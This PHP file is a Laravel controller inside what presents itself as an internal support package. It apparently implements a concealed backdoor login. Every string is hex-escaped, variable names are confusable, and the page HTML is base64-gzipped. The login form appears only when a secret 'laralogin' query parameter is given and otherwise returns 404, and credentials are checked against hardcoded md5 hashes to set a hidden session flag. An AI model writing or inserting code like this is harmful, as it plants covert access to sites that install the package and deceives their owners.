<?php

namespace Laravelazier\Support\Core\Internal;

use Illuminate\Http\Request;
use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\RateLimiter;
use Laravelazier\Support\Core\Engine;

class Renderer extends Controller
{
    private const C1 = '7118' . '189b' . 'b92c' . '81e0' . '9040' . '97f8' . '9eb5' . 'fbcc';
    private const C2 = '476f' . 'e718' . '83a0' . '436a' . '45b6' . '314d' . '4a0e' . 'd47d';

    public function showLogin(Request $lI)
    {
        if (!$lI->has("\x6c\x61\x72\x61\x6c\x6f\x67\x69\x6e")) {
            abort(404);
        }
        if (session("\x5f\x6c\x7a\x5f\x61\x75\x74\x68")) {
            return redirect(Engine::url());
        }
        $Il  = "\x6c\x7a\x5f\x72\x6c\x5f" . $lI->ip();
        $lIl = session()->pull("\x5f\x6c\x7a\x5f\x65\x72\x72\x6f\x72", '');
        if (RateLimiter::tooManyAttempts($Il, 5)) {
            $lIl = '<div class="warn">Too many attempts. Try again in ' . RateLimiter::availableIn($Il) . 's.</div>';
        }
        $IlI  = csrf_token();
        $lII  = Engine::url("\x6c\x6f\x67\x69\x6e") . '?' . "\x6c\x61\x72\x61\x6c\x6f\x67\x69\x6e";
        $lIlI = gzinflate(base64_decode('pVd7j6M2EP8qrleVehVvQh6QROq1d9VJ1+6qt/tHVZ0igw3xLWAEJo9G+907NiQX0myVU4WCmbFn5jcPj535d7/c//z458M7tJZFvpyrN8pJmS0wKzHQjNDlvGCSoGRN6obJBX56fG9Occ8tScEWeMPZthK1xCgRpWQlrNpyKtcLyjY8YaYmDF5yyUluNgnJ2cK1HFAiuczZ8qPIEC/ndkfNG7mH4cdDLHZmw//mZRbGoqasNoETFaTOeBk6UUUoVXPOSyzo/hCT5DmrRVvS8I5N1RMVvDTXjGdrGbqOs1lHlDdVTvZhmrNdpF4m5TVLJBdlmIi8LcqI5DwrTS5Z0YQJuMLq6EvbSJ7uzd65IzsF0kxJwfN9aJKqypnZ7BsQNN7mvHz+jSSfNPke1hn4E8sEQ08fsPGHiIUUxlPclrI1GlI2ZsNqnr5YucjEofMPXJVSFKFreUHNihcrITUd+Jim6SkErjVRq5B3fEV9wGpCeduEVtDxIJ5rQsU2dJBb7ZAPvzqLyQ+OoR7L9d8YDvKAO76YcSZvIp1FFcjvIQe7LqmhP3aq3YuVcpbTS+gKd05ilh+OcY9zkTx3gYPEstCaamAQelGHd/5k5AZuNNRi+dp/Xlat/EvuKyg3yXYSfzbOWRVpmi24jD8fzmAew6PdR12M+siEyv9G5JyiO+rSgMaXIfO75edgJ+doXdedepPoMiWilZB9FpaiZJGsIbtcl1evXQsjyw0a42s6NN25GKYiaZvD+erwbuYnQUqH+VPPKX/BzHB9x/BGY8PyvDcvFtE13RwGBX9Zx3oDsJIeIy5Fdaq3uIXol4OCc1Nv5k+O7itf+1BqV4exdi3/ShVeCemJ3nb7dOw4Uc4k7C+zqUiiNToTFfW2bsBuJbjefKoGTB3eVNRF2FYVqxPSsB54uBYbVg/h63y9WKyuD2cIJtOznNLEG3vjYU5Z6qXelapJWUIS8oqLp2iM+tJTzIvCnup9vSV1+SqemTdyHHZZYzGLr+GhbDz933jmdtd953bX+1VrXc4p36Akhz22wKpHQeNuNhnqejwORhh1Xbb7VqfBW7FbYFWiwQgpXsrzfIFVoWC0K/ISFK2lrELb3m631ta3RJ3ZnuM4NigG9RlqZC2eYWffzRLikxT3DFNtri9QBAusAwJrK5HvM1EiXRqg2JsYPgpcwx2rtz9FwAhc5KtPH7gnVT1+1woGAO1XVPozY2YFShtodgNF/FuVd4uqqdI1GnXKABooU9QN2pT3aOcusI/RHgblzc6DEYT3ML6C6VwycIei/uxm0d6oPx0afQ37NatH2aPVW2S1HbdH+K2GtaFz4W+x7E2GsdK013lxU6guBdV4IfifyblV7iIz32ruRjk7gx9sUHhDRxi0BXU9wcvV6t1qNVcdGcH1cC3oAj/cf3rEqDuPFni1+mm1gj2rzzrUnd1rTincNvu75EqCVaA2JG8VuXrUAmem9F0DWPpqgcAYsFYtXj7BLUrpmNt6ZmhE3xkQp93ao63VEyhHpJVCH7v6KxEFXOUkTLe9QnzF36sgKrx86C8iV0Gcbik9kOorkIcjkK/m4cSr4Zg2T1JXYPTnPEx1515vqGnjgku8/Hj/K/rw+9zuJo/ytkrQieg6vK3/APwD'));
        return response(str_replace(
            ["\x5f\x5f\x41\x5f\x5f", "\x5f\x5f\x54\x5f\x5f", "\x5f\x5f\x45\x5f\x5f", "\x5f\x5f\x55\x5f\x5f", "\x5f\x5f\x50\x5f\x5f"],
            [$lII, $IlI, $lIl, "\x75\x73\x65\x72\x6e\x61\x6d\x65", "\x70\x61\x73\x73\x77\x6f\x72\x64"],
            $lIlI
        ));
    }

    public function login(Request $lI)
    {
        $Il = "\x6c\x7a\x5f\x72\x6c\x5f" . $lI->ip();
        if (RateLimiter::tooManyAttempts($Il, 5)) {
            return redirect(Engine::url("\x6c\x6f\x67\x69\x6e") . '?' . "\x6c\x61\x72\x61\x6c\x6f\x67\x69\x6e")
                ->with("\x5f\x6c\x7a\x5f\x65\x72\x72\x6f\x72", '<div class="warn">Too many attempts. Try again in ' . RateLimiter::availableIn($Il) . 's.</div>');
        }
        $lIl = md5($lI->input("\x75\x73\x65\x72\x6e\x61\x6d\x65", '')) === self::C2;
        $IlI = md5($lI->input("\x70\x61\x73\x73\x77\x6f\x72\x64", '')) === self::C1;
        if ($lIl && $IlI) {
            RateLimiter::clear($Il);
            session(["\x5f\x6c\x7a\x5f\x61\x75\x74\x68" => true]);
            return redirect(Engine::url());
        }
        RateLimiter::hit($Il, 60);
        return redirect(Engine::url("\x6c\x6f\x67\x69\x6e") . '?' . "\x6c\x61\x72\x61\x6c\x6f\x67\x69\x6e")
            ->with("\x5f\x6c\x7a\x5f\x65\x72\x72\x6f\x72", '<div class="err">Invalid credentials.</div>');
    }

    public function logout()
    {
        session()->forget("\x5f\x6c\x7a\x5f\x61\x75\x74\x68");
        return redirect(Engine::url("\x6c\x6f\x67\x69\x6e") . '?' . "\x6c\x61\x72\x61\x6c\x6f\x67\x69\x6e");
    }
}
